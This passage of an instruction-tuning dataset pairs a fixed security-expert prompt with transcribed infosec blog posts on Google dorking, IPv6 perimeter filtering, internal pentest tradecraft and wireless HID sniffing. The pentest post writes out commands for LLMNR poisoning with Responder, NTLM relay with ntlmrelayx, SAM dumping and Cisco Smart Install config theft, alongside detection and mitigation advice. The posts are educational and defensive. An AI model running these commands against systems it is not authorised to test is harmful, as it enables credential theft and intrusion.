        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Getting Started With Basic Google Searches</title>\n<taxonomies>Author, How-To, Informational, InfoSec 101, John Strand, Google</taxonomies>\n<creation_date>Mon, 04 May 2020 14:15:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "outu.be l2hN3Tluzi0 Hello and welcome My name is John Strand and in this video we're going to be talking about some very basic Google searches Now we've got to take a couple of steps back and talk about what Google actually does Google goes through and it indexes all the different texts and images and things they can find on the internet Once I had somebody describe Google's entire business model is just creating a reverse index of the internet and that may or may not be true but the point is it's an incredibly powerful tool for security professionals to potentially identify weaknesses in their security architecture that Google has indexed So I'm going to just show you just a couple of very very very basic Google searches that you can use in a variety of capture the flag scenarios and against your own site to try to find some vulnerabilities So I'm going to start with some basic start searches that you can work with One of the most heavily used ones is site The reason why we use site is you can use site and have your specific search focus in like a laser beam on just your domain And usually whenever I'm doing this I'm looking for something or I'm actually kind of I'd like to think of it as like panning for gold I'm sifting out all the things I don't care about to try to get down to something interesting Now just to be clear I'm not trying to hack any sites with this particular demo but I'm showing you how you can identify vulnerabilities on your own infrastructure fairly quickly and fairly easily So whenever I do a site And let's say I put in Microsoft I put in Microsoft.com That's going to restrict all of my searches to just Microsoft.com So I can do site Microsoft.com and do cats and we'll see if any website at Microsoft has anything from cats And here we go It says all right Download Kaggle Cats and Dogs dataset from Microsoft cats at Microsoft stories So you can see we restricted our search to just that And that's pretty cool especially whenever you're looking for files So you can look for things like doc or you can look for like docx or ppt or find any number of different file extensions Usually whenever I'm doing a search though on a site what I'm trying to do is sift through things that are easily identified with Google to try to find the lesser-known things that Google has indexed So what I'll do is I'll do a site Microsoft.com or site Microsoft.com So let me put this in properly So we've got site Microsoft.com And now what we can actually do is we can now start excluding things that I already know exist So I could do -www because I don't care about www.Microsoft.com And I can do -docs like that and it's going to exclude Microsoft docs Here we got what is it go.Microsoft.com It just says it's a Microsoft site I might find that interesting and I'll throw it over Once again I'm not expecting to find anything like super super interesting We're not trying to do that at all but I'm showing how you can exclude things so I'm to do -go go docs and let's do -tech community I want to remove that and then we'll do -support So if you look up here at the top you can see that we're kind of building a list of all the different sites that exist at Microsoft This may not sound all that interesting However whenever you're looking at this from a security practitioner's perspective it becomes incredibly important because there may be parts of your infrastructure that Google has indexed that you're exposing that you never expected to expose ever under any circumstances at all For example you may have alternative VPN login portals you may have remote administration pages for various websites firewall administration pages all kinds of different login pages Tandberg devices Polycom devices All of these things will eventually show up as you start sifting through a website and all of the different parameters that can exist on that In fact whenever I'm working with IANS it's not uncommon for me when I'm talking on the phone for expert decision support where I'm typing this in while I'm talking to a customer and so far twice in the past three years while I've done that on the phone with a customer kind of a habit that I have I have found completely exposed interfaces For example I was able to find a full video camera interface for their security cameras for one of our customers I was able to find a page without authentication that allows you to manage and edit and work with the certificates for TLS SSL on their websites So this is pretty heavy stuff and it just involves a little bit of curiosity and digging in Some of my other ones that I like working with whenever I'm working with sites is I can work within title index of Now the vast majority of what you find if you work with this particular Google search isn't all that interesting but it does at least show how this can be useful You see if somebody is enabled indexable directories on their website it does just that It's an index of the directory structure for the webserver and many times this will allow you to identify various directories pull down source code for pages And by the way the source code is completely different than what you see when you do view source You may find things like user IDs and passwords for backend database connections So this is one of my all-time favorites working with index of and here's just a couple of examples from developer Apple.com and here's Apache software foundation distribution directory Now once again I'm not trying to hack anything and show you Oh this is how you hack a site but what happens is you'll see something very similar to this If you have a vulnerable website in your organization you'll have a web server and it'll list out all the directories for that web server and then you're able to go into those various directories and you're able to see various files Now that may not sound interesting but once again if you start getting the things like source code from indexable directories or documents with metadata it starts getting very interesting very very quickly So this is just a basic Google search primer and these are the things that I do as table stakes anytime we're working on a pentest because these things many times will turn up vulnerabilities that your standard scanner may not turn up and set as critical So be sure to check it out on your own organization So you'll go through and just do site your domain and then you'll start doing minus the pages that you see show up If you get all the way down to nothing congratulations and nothing surprises you that's great But if you start seeing things like weird authentication portals default web pages things of that nature you're going to want to clean those up So thank you so much for joining this particular edition of Getting Started with Black Hills Information Security And I hope to see you in another video Don't forget to check us out every Wednesday where we do Enterprise Security Weekly So thanks again and I can't wait to see you in another video"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Securely Deploying IPv6 in 2020 Part 1: Internet Facing Perimeter</title>\n<taxonomies>Author, Informational, InfoSec 101, Joff Thyer, IPv6, Joff Thyer</taxonomies>\n<creation_date>Mon, 11 May 2020 12:06:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer Introduction If there is anything that the start of 2020 has taught us it is that Internetworking services are in higher demand than ever before IPv4 is exhausted and by that I mean there is none it is tired worn out overused abused and beyond its end of life Besides our heroic attempts at variable-length subnetting which placed an enormous burden on enterprise routers and exponentially grew the global route table we still ran out of addresses Network Address Translation is equally overused and abused It is not and never was intended to be a security technology NAT is simply address conservation and the fact that we now have globally deployed natted networks behind other natted networks is beyond ridiculous and more to the point stretching the intent well past its original design We own a nod of appreciation to all those that have valiantly extended IPv4's life way beyond its shelf life but it is truly past time to commit to IPv6 Users that use Google over IPv6 across the last decade Rather than exclusively give a tutorial on IPv6 I am going to talk specifically about infrastructure security that we must have in place to safely deploy the protocol We should start with and understand some of the foundational knowledge First of all IPv6 is a 128-bit address space It is known as IEEE 802 protocol 0x86DD within an Ethernet header or if encapsulated in an IPv4 header it is carried as IP protocol number 41 6 in 4 As of today IANA has allocated out IPv6 address space across the world to the various Regional Internetworking Registries which consist of ARIN RIPE NCC APNIC AFRINIC LACNIC For additional background details ww.iana.org assignments ipv6-unicast-address-assignments ipv6-unicast-address-assignments.txt n.wikipedia.org wiki Regional_Internet_registry The address allocations are as follows 12 seven IPv6 blocks spread across various RIR's 16 one block for 6to4 translation 18 one block to RIPE NCC 19 two blocks one to RIPE NCC and another to APNIC 20 three blocks one to RIPE NCC and two to APNIC 22 three blocks to RIPE NCC 23 eighteen address blocks spread across various RIR's Percentage of Autonomous Systems that Announce an IPv6 prefix These address allocations are enormous If only 12 bits are set for the network prefix then 116 bits can be further allocated by Internet Service Providers In pure host address terms that is 2 116 which is 8.4 e24 addresses It is the case that most service providers will further allocate addresses in 32 48 and 64 blocks Refer to ools.ietf.org html rfc6177 for more information as this is an active discussion To view the current state of the IPv6 BGP global route table refer to gp.potaroo.net v6 as2.0 index.html Right now it seems that if your organization is multi-homed with your own BGP Autonomous System Number ASN you are likely to be allocated an IPv6 48 which is a whopping 2 80 addresses from which you can further sub-network into 64's If you are single-homed or tunneling you will probably receive an IPv6 64 allocation which is twice the size of the entire IPv4 address space and if you desire to do so you can further subnet this space internally I know you are now thinking that you want in After doing my initial homework that's exactly what I thought Being a total infrastructure and endpoint security consultant malware developer musician mathematician and outright geek I just had to get my hands on this stuff as soon as I could So I called up my friends at my local ISP and I said Hey guys I want an IPv6 address block And they said We don't carry IPv6 cue the you just lost your PACMAN game music I am fortunate enough to have a small static IPv4 allocation so I thought to myself it's time to tunnel so I can build an IPv6 testbed I went out and started researching and came across this n.wikipedia.org wiki List_of_IPv6_tunnel_brokers I chose to create an account with Hurricane Electric based on their widespread reach and literally in a few minutes I was granted an IPv6 64 address block as long as I tunnel the traffic using IP protocol 41 n.wikipedia.org wiki 6in4 My tunnel interface configuration on an Ubuntu system looks like this well with a few redactions You honestly did not think I was going to give you my IPv4 IPv6 addresses did you Linux 6in4 protocol 41 Configuration Now you ask What's the first thing I did as soon as that tunnel came up It's pretty simple I installed and configured DNS because who in their right mind wants to remember an IPv6 address Not too difficult with a debian Linux to do so apt install bind9 will do it but you probably want to adjust your settings to use the local resolver afterwards And now for some basic connectivity testing Wait who would possibly have IPv6 deployed I bet the usual suspects of sizable organizations like Google Amazon Microsoft and Research Universities I tested my local DNS resolver using our friend dig after learning how exactly to use it with IPv6 I kid you not adjusting your brain out of v4 mode is a real thing Sample DNS Lookup Traffic using dig I think I have my sea legs albeit wobbly so let's proceed further Of course we need to try ICMP echo request reply and traceroute In IPv6 world these commands in Linux become ping6 and traceroute6 Sample ICMP Echo Request Reply Traffic Sample traceroute6 Traffic After that high-level introduction let's talk about security which is where the action really needs to be I would like to break this down into four important topics IPv6 Addressing and Scope Internet Control Message Protocol ICMPv6 and Perimeter Network Security You might notice that Internal Network Security is conspicuously absent Considering the breadth of coverage here I decided to leave the Internal Network Security topic for a follow-on article IPv6 Addressing and Scope There are three different kinds of IPv6 address unicast anycast and multicast Both unicast and anycast addresses have two different scopes these being link-local and global For multicast the four least significant bits in the second address octet determine the scope Multicast addresses start with ff0 and different scoped addresses are as follows FF00 reserved unused FF01 interface local host bound loopback multicast FF02 link local FF03 realm local FF04 admin local FF05 site local FF08 organization local FF0E global FF0F reserved unused Internet Control Message Protocol Version 6 ICMPv6 Before I start these discussions we cannot avoid talking about ICMPv6 without which IPv6 just will not work The first fabulous and exciting revelation is that the IPv4 Address Resolution Protocol ARP is gone and good riddance IPv6 is very much multicast dependent for many functions and a tremendous amount of discovery uses ICMPv6 and multicast together Similar to ICMP in v4 there are ICMP types and codes in the packet ICMPv6 can be broken down into four categories Error Messages Informational Messages Neighbor Discovery Messages and Other IPv6 Protocol Control Messages Error Messages Type 0 Reserved Unassigned Type 1 Destination Unreachable The code field contains the reason Code 0 No route to destination Code 1 Administratively prohibited Code 2 Unassigned Code 3 Address Unreachable Code 4 Port Unreachable Type 2 Packet too big Important for the path MTU discovery mechanism to work properly Type 3 Time exceeded message Code 0 Hop limit exceeded in transit Life lesson Don't let you TTL expire because you will be dropped Code 1 Fragment reassembly time exceeded Type 4 Parameter problem message Code 0 Erroneous header field encountered Code 1 Unrecognized next header type Code 2 Unrecognized IPv6 option encountered Types 5 through 127 are unassigned or reserved for experimentation Informational Messages Type 128 Echo Request Type 129 Echo Reply Type 130 Multicast Listener Query Type 131 Multicast Listener Report Type 132 Multicast Listener Done Neighbor Discovery Messages Type 133 Router Solicitation Type 134 Router Advertisement Type 135 Neighbor Solicitation Type 136 Neighbor Advertisement Type 137 Redirect Other IPv6 Protocol Control Messages as defined by various RFC's Types 138 161 are currently defined Please refer to ww.iana.org assignments icmpv6-parameters icmpv6-parameters.xhtml for more information Types 162 255 Unassigned Reserved or Experimental Use Perimeter Network Security As you might imagine with perimeter network security many of the concepts we used for securing IPv4 can in fact be ported across to IPv6 For this part of the discussion let's break the topics into categories as follows Allocated Address Space Filtering Anti-Spoofing Filtering ICMPv6 Filtering Multicast Filtering Protocol Normalization Exterior Border Gateway Protocol Security DMZ Internet Facing Server Address Allocation Perimeter Allocated Address Space Filtering An alternative topic name here might be Return of The Martians or Bogons Live Another Day In short there is a lot of unallocated address space in IPv6 and you should not allow a packet into your network unless it is sourced from an allocated address block.In reality this is very simple IANA has today allocated 35 address blocks You can define an ACL on your perimeter router to only allow traffic sourced from these 35 blocks and drop everything else With my Linux tunneled solution I used iptables and related ip sets implementing as follows Ip6tables IANA Allocated Filtering Note that in the screenshot above I am assuming that the router tunnel endpoint will not only possibly initiate traffic itself but will be responsible for IP version 6 traffic forwarding across some defined sub-networks in the future Of course any OSI layer 4 filtering will have to be implemented in the above ruleset also so this represents just a baseline starting point Remember that OSI layer 4 and up with IPv6 is fundamentally unchanged from IPv4 One more thing to be aware of is that IANA allocations of IPv6 will of course change In my case I used a simple shell script to parse out the allocated blocks and update my IP set with the correct data Because I am a nice guy I am including that script here Simple Script to Create a List of IANA IPv6 Allocations Perimeter Anti-spoofing Filtering The golden rule is that no packet should enter your network that has a source address representing your allocated address block Equally no packet should leave your network that has a destination address matching your allocated address block Ip6tables anti-spoofing filtering Perimeter ICMPv6 Filtering As stated above with ICMPv6 the IPv6 protocol just breaks making the topic of securing ICMPv6 extremely critical not just for the perimeter but for the interior of your networks also You cannot take the IPv4 style naive approach of just dropping this protocol but rather you need to be more nuanced Filtering ICMPv6 can be broken into two categories that being traffic that is initiated from a perimeter security device versus that being traffic that should transit the security device I will keep this portion of the discussion to transit traffic that is important to the perimeter security policy stance of an organization Transit traffic you should allow to pass through to from the Internet All other transit ICMPv6 traffic should be dropped These are my opinions combined with interpretation of ww.ietf.org rfc rfc4890.txt Type 1 destination unreachable you might optionally be selective and pick port unreachable code only Type 2 Packet too big You don't want to break path MTU discovery Type 3 Time exceeded but code 0 TTL hop limit expired only Type 4 Parameter problem codes 0 and 1 only Type 128 129 Optionally you can allow ICMP echo request reply at your discretion but the same caveats as IPv4 apply If you drop you can break Teredo tunneling so apply with care Types 144 147 apply to mobility enabled networks and can optionally be dropped with an understanding of the loss of functionality Another important point is that an organization needs to make a policy and operational decision related to whether the organization wants to participate in global multicast sources If so then transit traffic will need to include multicast router discovery advertisement and termination messages which are types 151 through 153 With regard to ICMPv6 messages initiated from the perimeter security device the above list excluding the mobility enabled types 144-147 should be allowed to pass In addition address selection and router selection messages should be allowed to pass including Types 133-134 Router solicitation advertisement Types 135-136 Neighbor solicitation advertisement Types 141-142 Inverse Neighbor Discovery solicitation advertisement All other multicast receiver router discovery and also SEND path notification messages refer to RFC ICMPv6 Type 137 Redirect Messages represent a significant security threat and should always be dropped As with any network packet filtering a default deny all unless explicitly permitted is the most sound approach If possible implement packet inspection of the source and destination addresses of any unicast ICMPv6 Specifically if the embedded payload within the packet does not have a destination address that matches the source address of the ICMPv6 packet it should be dropped Conversely if the embedded packet payload does not have a source address that matches the destination of the message it should be dropped In addition to these filtering decisions you should always limit the potential for denial of service attacks by applying rate-limiting configuration for all ICMPv6 messaging In my opinion no policy decision is warranted on unallocated reserved or private experimental messages for ICMPv6 All of these remaining messages should be dropped For your information here are my Linux iptables rules for forwarding transit ICMPv6 across my router which are very ICMPv6 type-specific with an applied rate limiter ICMPv6 Packet Forwarding Rules Also below is a screenshot of ICMPv6 iptables rules for handling neighbor and router discovery within the internal LAN These are deliberately not applied to the tunneled ipv6 interface and there is of course a default packet drop policy beyond that which is accepted ICMPv6 Router Neighbor Discovery Rules Perimeter Multicast Filtering If inter-domain multicast is not desirable then strict perimeter filtering is essential Additionally any spoofing of packets with multicast as a source address are certainly spoofed and should be dropped Assuming that your policy is to not participate in inter-domain multicast then you should filter the following at your perimeter Any packet with a source address that is multicast Block drop reserved and unused unassigned multicast destinations FF00 16 reserved FF06 16 FF07 16 unassigned FF09 16 through FF0D 16 unassigned FF0F 16 reserved Block drop all global scope multicast destinations FF0E 16 Block drop all site-local scope multicast destinations FF05 16 Block drop all organization-local scope multicast destinations FF08 16 Consider blocking dropping realm-local FF03 16 These will be specific to other RFC's and must be a policy decision For more specific information please refer to ools.ietf.org html rfc7346 Perimeter Protocol Normalization IPv6 has a protocol header labeled next header It is possible to continue chaining extension headers together into an extremely long chain of extension headers before the OSI layer 4 headers are encountered Extension Header Example It is possible to create a denial of service attack using long chains of extension headers all of which need to be processed by perimeter security firewalls and or routers Extension header attacks can also be leveraged to blind Intrusion Prevention Systems IPS through the prevention of full packet inspection Table of IPv6 Extension Headers Outside of the above table of extension headers the normal OSI layer 4 protocol numbering is used for TCP 6 and UDP 17 Absent from the above table is extension header 59 which has a special meaning of no next header There are some normalization rules which should be enforced by packet inspection devices such as firewalls and intrusion prevention systems Each extension header should not appear more than once except the destination options header The Hop-By-Hop options header should only appear once and should always be the first header in the list The destination options header should be last in the list and should appear at most twice The fragment header should not appear more than once I think it is fairly self-evident that extension headers present security risk if not properly normalized and or filtered and also present denial of service risk if processed by packet normalization devices One particular security concern presented is the use of the Routing Options Header 43 along with type 0 known as an RH0 attack Routing headers are very similar to IPv4 strict source and loose source routing options which allow an attacker to specify a particular layer 3 path through which to route a packet Worse still is a use case whereby the same address can be included in a single Routing Header multiple times setting up a potential packet oscillation and amplification attack Within both the destination options header and the hop-by-hop options header there is a possibility that padding options PADN might be included to pad to an 8-octet boundary These padding options must always be set to the value of zero otherwise could be seen as a covert channel mechanism Summary Recommendations Ensure that a packet normalization device firewall or IPS is able to enforce the extension header rules listed above Drop any traffic that contains a Routing Options Header 43 with type 0 source routing Drop any traffic wherein padding options within destination or hop-by-hop extension headers contain data other than zeroes Drop any traffic that contains extension headers that are reserved undefined or otherwise used for experimentation and testing Exterior Border Gateway Protocol Security The border gateway protocol BGP is still with us and widely used for both IPv4 and IPv6 wide area route tables Fortunately with the introduction of the IPv6 route table and the leveraging of class-specific address boundaries the size and processing requirements are significantly less than the highly fragmented IPv4 route table Similar security concerns for deploying BGP in the IPv6 world as have been present with IPv4 Use explicitly configured BGP peers Threats include TCP sequence number prediction because BGP is a long-lived connection Use hash-based peer authentication MD5 hashes are still common Optionally leverage an IPSEC tunnel for peering Use loopback addresses for peering IP peer address cannot be easily determined through traceroute Filter BGP peer traffic based on packet hop limit TTL The peer router will send BGP with a hop limit of 255 so only accept BGP traffic that has a hop limit of 254 and higher Filter the prefix length being received Most providers will just filter based on 32 and shorter or a specific prefix length Filter long autonomous system number ASN paths Using some form of route policy map can be used to enforce AS paths to less than a specific length A number at or around 40 should be plenty See below graph from gp.potaroo.net cgi-bin plota?file 2fvar 2fdata 2fbgp 2fv6 2fas2 2e0 2fbgp 2dmax 2daspath 2dlength 2etxt descr Maximum 20AS 20Path 20length ylabel Maximum 20AS 20Path 20length with step Maximum AS Path Length Over Time Filter private AS numbers in routing updates IANA has designated AS numbers 64512 65534 as private Filter reserved AS numbers in routing updates 0 and 65535 Log BGP neighbor activity Disable ICMPv6 Neighbor Discovery ND between BGP peers There is no need for it If at all possible consider deploying Unicast Reverse Path Forwarding checks URPF In strict mode a packet must be received on an interface that the router would use to route a destination return packet to In loose mode a packet must be received on any interface that is contained as a destination somewhere in the route table Perimeter DMZ Internet Facing Server Address Allocation Once you have secured your address allocation you probably are dealing with either a 48 or a 64 address block Now of course like any other organization you are welcome to further sub-network this allocation however you please Whether in a cloud-hosted situation or your own DMZ Internet-facing deployment I would recommend you keep the sub-network fairly large in size You might choose for example to carve up your 64 block into 72 sub-networks or similar and perhaps allocate one or two of these for your organizational DMZ When you perform subnetting while your router gateway address will probably be predictably allocated for consistency it is highly recommended to allocate your server addresses in a random fashion This will mitigate the risk of server discovery during the scanning reconnaissance attack phase Since the address space is so vast this becomes in effect a sparse allocation making discovery significantly challenging You would also want to statically address your server rather than depending on IPv6 Stateless Address Autoconfiguration SLAAC which is more suitable for client-side station address allocation in a residential ISP context In a managed organizational context operators will more likely prefer DHCPv6 for address allocation due to the extra control than can be exerted You could even go as far as to randomly change your address allocation as long as you retain the ability to efficiently update the associated DNS infrastructure An alternative to this would be to sequentially cluster your static addressing choices toward one portion of the address space Perhaps for example starting from one address different from the router address This would fall under the category of predictable address allocation and such knowledge would potentially speed up resource asset discovery Tools for Infrastructure Security Testing As we progressed through this article you can already see that I have used a number of tools for testing and probing purposes Some are included in a standard Linux distribution whereby some more advanced tools are not Scapy python packet crafting and research tool capy.net Ping6 linux built-in Traceroute6 linux built-in ww.si6networks.com tools ipv6toolkit ithub.com vanhauser-thc thc-ipv6 Some of the toolkit orientated tools mentioned above are more focused on LAN Internet Network attacks in an IPv6 context The general internal network security posture is in fact significantly compromised the longer we remain in a dual-stack IPv6 IPv4 environment Unfortunately like so many things this part of our work is going to be the hardest migration phase to tackle for many unless you are lucky enough to be operating in a greenfield Conclusions There is no doubt that there is enough depth of experience for us to take the plunge into the world of IPv6 Organizations should definitely be looking at providing Internet-facing services with appropriate protections available in the IPv6 domain Residential internet service providers are already struggling to continue with any IPv4 and will continue to move towards IPv6 This leaves us with internal network security concerns which I will write about in a future article Many different sources of information were used in constructing this article which include IPv6 Security by Scott Hogue Cisco press ww.apnic.net community ipv6-program ipv6-bcp ww.team-cymru.com ww.iana.org assignments ipv6-address-space ipv6-address-space.xhtml ww.cidr-report.org v6 as2.0 gp.potaroo.net index-v6.html 6asns.ripe.net v 6"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>A Pentester's Voyage - The First Few Hours</title>\n<taxonomies>Author, How-To, Informational, InfoSec 101, Jordan Drysdale, Red Team, Jordan Drysdale</taxonomies>\n<creation_date>Wed, 13 May 2020 12:28:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Many methodologies have been written but the first few hours on an internal pentest tell the story of an organization's security culture This type of test differs from an assumed compromise or pivot in that the tester walks into the network fully armed requirements.txt Nmap map.org Responder ithub.com lgandx Responder Impacket ithub.com SecureAuthCorp Impacket CrackMapExec ithub.com byt3bl33d3r CrackMapExec LDAPDomainDump ithub.com dirkjanm ldapdomaindump BloodHound ithub.com BloodHoundAD BloodHound ADExplorer ocs.microsoft.com en-us sysinternals downloads adexplorer OffSec's ExploitDB ithub.com offensive-security exploitdb SIET ithub.com Sab0tag3d SIET defenses.txt Microsoft's Baseline Audit Configuration ocs.microsoft.com en-us windows-server identity ad-ds plan security-best-practices audit-policy-recommendations Sysmon ocs.microsoft.com en-us sysinternals downloads sysmon Sysmon-modular config ithub.com olafhartong sysmon-modular Killing LLMNR ww.blackhillsinfosec.com how-to-disable-llmnr-why-you-want-to README.md It is 7 15 AM local timezone The weather is nice and we'd all rather be outside but we have an internal test starting this morning The implant is calling back from the customer network and after grabbing a cup of coffee it's time to get started LLMNR and NBNS are almost universally the first things I check for Within 5 or 10 minutes the question Is there LLMNR mDNS NBNS on the local network has usually been answered python Responder.py -I ens160 -A At this point we know it is game on and that bad things are likely to happen in the next couple of days FINDING Network Vulnerable to LLMNR and NBNS Poisoning Checking for SMB signing on a few local systems is also important for the SMB and NTLM relay race Running the following Nmap scripts check will lead us in the direction we want to go ls usr share nmap scripts grep smb The next quick Nmap scan checks for known SMB ports and knocks The polite question is do you support SMB signing and is it kindly enforced nmap -sU -sT -p U 137 T 139 445 --script smb2-security-mode.nse 10.10.98.0 24 FINDING SMB Message Signing Disabled At this point it is about 7 55 AM and I have gone through this process as I would on any pentest and documented this blog as if it was a pentest The environment in question is the Applied Purple Teaming and was designed by krelkci and I rev10d so as such does not need redacted in any way It is time to check for a couple of quick hits and potentially devastating network vulnerabilities Back to Nmap nmap -p 4786 10.10.0.0 16 -oG smart-installs FINDING Cisco Smart Install Client Service Available Then we can pull the configs with SIET siet.py -i 10.10.10.10 -g FINDING Cisco Type 7 Passwords In Use It is about 8 30 AM local time at this point and a series of findings have been produced and it is time to gear up and get serious The LLMNR Relay attacks have been discussed extensively here and all over the security sphere so I will limit the details to as little as possible Disable SMB and HTTP responses in Responder.conf Fire up ntlmrelayx from the impacket examples directory and revisit the list of systems that lacked SMB message signing enforcement ntlmrelayx.py -tf smbtargets -smb2support With Responder running we gain access to remote systems dump SAM tables and compromise boxes With switch and router configs we can target remote networks we had no idea existed We have credentials at this point and can use LDAPDomainDump to gather the AD schema details But we want to catch this behavior too The following took a helping hand from a TrustedSec blog and a SIGMA rule but we eventually came to the same conclusion Which SIGMA rule ithub.com Neo23x0 sigma blob master rules windows builtin win_pass_the_hash.yml In our lab environment we could consistently catch the pass-the-hash attacks by monitoring event_id 4624 with logon types of ntlmssp and the security SID at S-1-0-0 NULL NOBODY You too can instrument this attack To catch Nmap scanning will require some modifications of your current boundary defense structures Where VLAN boundaries exist there are likely firewall zones or policies some companies are pretty lax with their segmentation However if there are firewalls making decisions about packet forwarding between IP sources and destinations the opportunity to implement IDS IPS at those boundaries exist So now you can catch the thousands of packets sourced from a single IP address targeting your disparate network ranges The latest versions of Cisco IOS address the Smart Install problem IOS now boots a client and waits a short period of time listens for control operations and shuts down when none are heard Seriously SMB message signing should be enforced The results of not doing so can be far too catastrophic to ignore In the simplest of terms these few attacks produce viable results that demonstrate the seriousness of on-by-default weak configuration There are defenses and mitigations for all of them including maintaining patched systems instrumenting segmenting networks and adding some group policies Thanks for reading as always This blog was brought to you by a cooperative partnership between Defensive Origins defensiveOGs and Black Hills Information Security bhinfosecurity"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Promiscuous Wireless Packet Sniffer Project</title>\n<taxonomies>Author, Fun & Games, Hardware Hacking, How-To, Informational, InfoSec 101, Ray Felch, Raymond Felch</taxonomies>\n<creation_date>Wed, 27 May 2020 12:15:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ray Felch Introduction After completing and documenting my recent research into keystroke injections Executing Keyboard Injection Attacks I was very much interested in learning the in-depth technical aspects of the tools and scripts I used created by various authors and security research professionals In particular I was interested in creating my own software hardware implementation of these exploits rather than blindly executing and accepting the work of others Obviously this effort required a deep-dive into the work of some very notable information security researchers such as Travis Goodspeed GoodFet 2009 Marc Newlin Bastille Research MouseJack 2016 Samy Kamkar KeySweeper 2015 Marcus Mengs Rogan Dawes Logitacker 2019 Darren Kitchen Ducky Scripts Hak5 phikshun infamy JackIt insecurity of Things 2017 and Thorsten Schr\u00f6der Max Moser KeyKeriki 2010 By taking on the challenge in this manner my intention was to create an 'all encompassing well-documented account of the many aspects of HID human interface device exploitation allowing others to also benefit from what I discovered along the way Research information Nordic Semiconductor The vast majority of wireless non-bluetooth receivers used with keyboards mice presentation clickers etc are based on the legacy Nordic nRF24L Series embedded hardware chips The ESB Enhanced Shockburst protocol used in Nordic transceivers allow for two-way data packet communication supporting packet buffering packet acknowledgment and automatic retransmission of lost packets The Nordic radio operates over the 2.4GHz ISM band 2.4 2.525GHz using GFSK modulation offering baud rates of 250kbps 1Mbps or 2Mbps and typically transmits at 4dBm yet capable of 20dBm of power The nRF24L01 transceiver uses channel spacing of 1MHz yielding 125 possible channels Nordic transceivers are capable of receiving on 6 pipes nodes and transmitting on 1 pipe They are capable of receiving on all 6 pipes simultaneously however can only listen on one channel at a time Note The target's device address must be known in order to read and write data to and from the remote device All configuration and data transmission are handled via SPI Serial Peripheral Interface using FIFO first-in first-out buffers Nordic's Shockburst packet protocol Notice that the address field is defined to be 3 to 5 bytes typically 5 Promiscuous Sniffing ravisgoodspeed.blogspot.com 2011 02 promiscuity-is-nrf24l01s-duty.html Interestingly Travis Goodspeed discovered back in 2011 that although the Nordic nRF24L transceiver chipset did not officially support packet sniffing a pseudo-promiscuous mode existed capable of sniffing a subset of packets being transmitted by various devices This was accomplished by ignoring Nordic's specification about the address being limited to 3 5 bytes Realizing that two bits defined the address size Travis set the address to the illegal value of zero and got a byte match By disabling CRC checksums he got an influx of false-positive packets that he could then examine for authenticity by manually calculating and confirming checksums Obviously without assigning a specific address to listen for this method would yield an enormous amount of traffic including false packets due to background noise Later Travis created his goodfet.nrf autotune script that significantly improved identifying MAC addresses and beacons Travis's research extended the work of Thorsten Schr\u00f6der and Max Moser of the KeyKeriki v2.0 project 2010 Note Although all vendors Microsoft Logitech etc using the Nordic nRF24L Series radio followed the same ESB packet protocol specifications how these vendors defined their specific payloads and hardware interaction varied tremendously Some used plain text communication with no encryption Others used encryption on their keyboard traffic but left mice plain text etc Thorsten Schr\u00f6der and Max Moser ww.remote-exploit.org articles keykeriki_v2_0__8211_2_4ghz built a hardware device based on an NXP LPC17 Arm Cortex-M3 microcontroller with SDR software-defined radio firmware Their device employed two different Nordic radio transceiver modules In order to successfully transmit receive and parse vendors packets they needed to analyze the content and attempt to find and determine any encryption cryptographic algorithms sequence counters being used and find the checksum algorithm necessary for transmission Their KeyKeriki project was instrumental in laying the groundwork for other researchers to follow Thorsten Schr\u00f6der and Max Moser determined the header of the Microsoft Keyboard packet was plain text and the remainder of the payload was encrypted using the device address as the secret key XOR'd with the data Example of Microsoft's keyboard encryption In 2016 Marc Newlin Bastille Research Mousejack Burning Man ww.bastille.net research vulnerabilities mousejack technical-details made some significant findings regarding vulnerabilities in quite a few well-known vendor devices Microsoft Logitech HP Dell Lenovo AmazonBasics See ww.bastille.net research vulnerabilities mousejack affected-devices Related to his research Marc Newlin noted The Crazyflie is an open-source drone which is controlled with an amplified nRF24L based dongle called the Crazyradio PA See ww.bitcraze.io crazyflie-2 This is equivalent to an amplified version of the USB dongles commonly used with wireless mice and keyboards Modifying the Crazyradio PA firmware to include support for pseudo-promiscuous mode made it possible to distill the packet sniffing and injection functionality to a minimal amount of Python code How is keystroke injection possible Wireless mice and keyboards communicate using proprietary protocols operating in the 2.4GHz ISM band Unlike Bluetooth there is no industry-accepted standard to follow and vendors are left to implement their own security methodologies Wireless communication between these devices is accomplished by transmitting radio 